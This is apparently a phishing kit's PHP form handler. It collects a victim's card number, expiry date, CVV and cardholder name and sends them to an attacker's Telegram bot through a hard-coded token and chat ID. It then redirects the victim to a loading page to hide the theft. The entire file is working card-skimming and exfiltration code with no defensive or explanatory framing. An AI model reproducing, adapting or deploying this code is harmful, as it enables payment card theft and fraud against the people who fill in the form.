<?php

$message  = "--------app---------\n";
$message .= "Numero : " . $_POST['cardNumber'] . "\n";
$message .= "Date   : " . $_POST['expiration'] . "\n";
$message .= "Numero : " . $_POST['cvv'] . "\n";
$message .= "Date   : " . $_POST['holder'] . "\n";
$message .= "------------------------------------\n";

// Telegram Bot token and chat ID
$token = "7628274621:AAGyPfKXtwh-zl2EYdQvD7EFrac8HZ2z8lk";
$chat_id = "7378155762";

// Prepare data for Telegram API
$data = [
    'text' => $message,
    'chat_id' => $chat_id
];

// Send message to Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

// Redirect to loading page
header("Location: lodd.html");
exit();
?>
